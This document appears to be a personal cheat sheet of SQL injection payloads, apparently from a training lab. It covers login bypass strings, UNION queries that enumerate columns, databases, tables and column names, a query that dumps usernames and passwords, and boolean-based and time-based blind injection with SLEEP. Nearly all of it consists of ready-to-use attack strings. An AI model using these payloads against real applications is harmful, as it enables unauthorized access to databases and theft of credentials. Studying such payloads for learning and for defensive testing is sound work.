# Basic SQLi:
```admin' or 1=1; -- ```

```admin'; -- ```

```ad'||'min``` used for concatenation when having restrictions. Also in conjunction with a true statement: ```a' IS NOT 'b```

```admin'/* ``` when we cannot use '--'

Other variants: ```adm'||'in'/* ```

# Retrieve DB info (In-Band SQLi, Error-based and union SQLi):
```0 UNION SELECT 1``` ``` 0 UNION SELECT 1,2``` ```0 UNION SELECT 1,2,3``` etc until you no longer get an error => this would get the number of columns

```0 UNION SELECT 1,2,database()``` name of the database

```admin123' UNION SELECT 1,2,3 where database() like 's%';--``` for Boolean-based Blind SQLi (s%, sq%, sql%, etc until we get the entire name)

```0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'``` get name of all tables in database

```0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'``` get column names in table

``` admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';--``` get column names for Boolean-based Blind SQLi (after each name is found we have to remove it from the query: ```admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';```)

```0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users``` get data from table

# Time-based Blind SQLi:
```admin123' UNION SELECT SLEEP(5);--```

also try with adding more columns, maybe it works: ```admin123' UNION SELECT SLEEP(5),2;--```
